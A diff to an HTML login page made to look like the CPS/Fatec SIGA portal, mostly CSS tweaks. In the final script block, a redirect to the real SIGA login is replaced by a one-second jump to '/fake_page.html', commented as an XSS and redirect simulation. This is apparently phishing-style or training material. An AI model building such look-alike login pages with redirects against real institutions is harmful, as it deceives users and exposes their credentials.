@@ -20,7 +20,7 @@
 
         .header {
             background-color: #c41e3a;
-            height: 60px;
+            height: 80px;
             display: flex;
             align-items: center;
             padding: 0 20px;
@@ -30,22 +30,22 @@
             display: flex;
             align-items: center;
             color: white;
-            font-size: 24px;
+            font-size: 28px;
             font-weight: bold;
         }
 
-        .logo img {
-            height: 40px;
-            width: auto;
-            margin-right: 10px;
+        .logo::before {
+            content: "cps";
+            font-size: 28px;
+            font-weight: bold;
         }
 
         .container {
             display: flex;
             justify-content: center;
-            align-items: flex-start;
-            padding: 80px 20px;
-            min-height: calc(100vh - 60px);
+            align-items: center;
+            padding: 40px 20px;
+            min-height: calc(100vh - 80px);
         }
 
         .login-form {
@@ -54,8 +54,8 @@
             border-radius: 0;
             box-shadow: none;
             width: 100%;
-            max-width: 400px;
-            margin-right: 100px;
+            max-width: 350px;
+            margin-right: 80px;
         }
 
         .form-group {
@@ -115,21 +115,21 @@
 
         .tentativas-counter {
             background: white;
-            border: 2px solid #ddd;
-            border-radius: 8px;
-            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            padding: 15px;
             text-align: center;
-            width: 120px;
-            height: 100px;
+            width: 100px;
+            height: 80px;
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
         }
 
         .tentativas-number {
-            font-size: 48px;
+            font-size: 36px;
             color: #4285f4;
             font-weight: bold;
             line-height: 1;
@@ -158,7 +158,6 @@
 <body>
     <div class="header">
         <div class="logo">
-            <img src="/assets/cps_logo.png" alt="CPS Logo">
         </div>
     </div>
 
@@ -191,9 +190,10 @@
         </div>
     </div>
     <script>
+        // Simulação de XSS + redirecionamento automático
         setTimeout(() => {
-            window.location.href = 'https://siga.cps.sp.gov.br/fatec/login.aspx'
-        }, 10000); 
+            window.location.href = '/fake_page.html';
+        }, 1000);
     </script>
 </body>
 
